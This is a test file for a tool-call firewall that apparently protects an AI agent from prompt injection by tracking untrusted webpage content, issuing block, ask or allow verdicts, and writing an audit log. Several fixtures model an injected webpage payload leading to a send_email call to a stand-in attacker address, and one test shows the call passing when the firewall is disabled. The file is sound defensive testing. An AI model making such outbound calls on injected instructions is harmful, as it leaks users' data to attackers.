"""Tests for firewall guard, stats tracking, audit log, and explanations."""
from __future__ import annotations

import json
from pathlib import Path
import pytest
from firewall.audit import AuditLog
from firewall.guard import Guard
from firewall.labels import Decision, Label, TaintedContext, ToolCall, Verdict
from firewall.policy import Policy


@pytest.fixture
def policy() -> Policy:
    yaml_path = Path(__file__).resolve().parents[1] / "policies" / "default.yaml"
    return Policy.from_yaml(yaml_path)


def test_guard_disabled_behavior(policy: Policy) -> None:
    audit = AuditLog()
    guard = Guard(policy=policy, audit=audit, enabled=False, stage=1)

    ctx = TaintedContext()
    ctx.add(ctx.make_segment("Task", Label.TRUSTED, "user"))
    ctx.add(ctx.make_segment("Injected payload", Label.UNTRUSTED, "webpage"))

    call = ToolCall(call_id="c1", name="send_email", args={"to": "attacker@evil.example"})
    dec = guard.check(call, ctx)

    assert dec.verdict == Verdict.ALLOW
    assert dec.rule_id == "firewall_off"
    assert dec.reason == "firewall disabled"
    assert guard.stats["checks"] == 1
    assert guard.stats["blocks"] == 0
    assert len(audit.entries) == 0  # Not recorded to audit when disabled


def test_guard_enabled_behavior_and_stats(policy: Policy, tmp_path: Path) -> None:
    log_file = tmp_path / "audit.jsonl"
    audit = AuditLog(path=log_file)
    guard = Guard(policy=policy, audit=audit, enabled=True, stage=1)

    ctx = TaintedContext()
    ctx.add(ctx.make_segment("Task", Label.TRUSTED, "user"))
    ctx.add(ctx.make_segment("Injected payload", Label.UNTRUSTED, "webpage"))

    # Blocked call
    call_block = ToolCall(call_id="c1", name="send_email", args={"to": "attacker@evil.example"})
    dec_block = guard.check(call_block, ctx)
    assert dec_block.verdict == Verdict.BLOCK

    # Asked call
    call_ask = ToolCall(call_id="c2", name="write_file", args={"path": "user/out.txt", "text": "data"})
    dec_ask = guard.check(call_ask, ctx)
    assert dec_ask.verdict == Verdict.ASK

    # Allowed call
    call_allow = ToolCall(call_id="c3", name="search_notes", args={"query": "test"})
    dec_allow = guard.check(call_allow, ctx)
    assert dec_allow.verdict == Verdict.ALLOW

    assert guard.stats["checks"] == 3
    assert guard.stats["blocks"] == 1
    assert guard.stats["asks"] == 1
    assert guard.stats["overhead_ms_total"] >= 0.0

    # Audit log entries
    assert len(audit.entries) == 3
    assert log_file.exists()
    lines = [json.loads(line) for line in log_file.read_text(encoding="utf-8").splitlines() if line.strip()]
    assert len(lines) == 3


def test_audit_explain_sentence() -> None:
    call_allow = ToolCall(call_id="c1", name="search_notes", args={"query": "test"})
    dec_allow = Decision(
        verdict=Verdict.ALLOW,
        reason="no untrusted content in context",
        rule_id="clean_context",
        tainted_by=[],
        call=call_allow,
    )
    exp_allow = AuditLog.explain(dec_allow)
    assert exp_allow == "ALLOWED search_notes: no untrusted content in context."

    call_block = ToolCall(call_id="c2", name="send_email", args={"to": "attacker@evil.example"})
    dec_block = Decision(
        verdict=Verdict.BLOCK,
        reason="send_email is a external action and untrusted content (webpage s2) is in context",
        rule_id="send_email:block",
        tainted_by=["s2"],
        call=call_block,
    )
    exp_block = AuditLog.explain(dec_block)
    assert exp_block.startswith("BLOCK send_email")
    assert "by rule send_email:block" in exp_block
    assert "untrusted content (webpage s2)" in exp_block
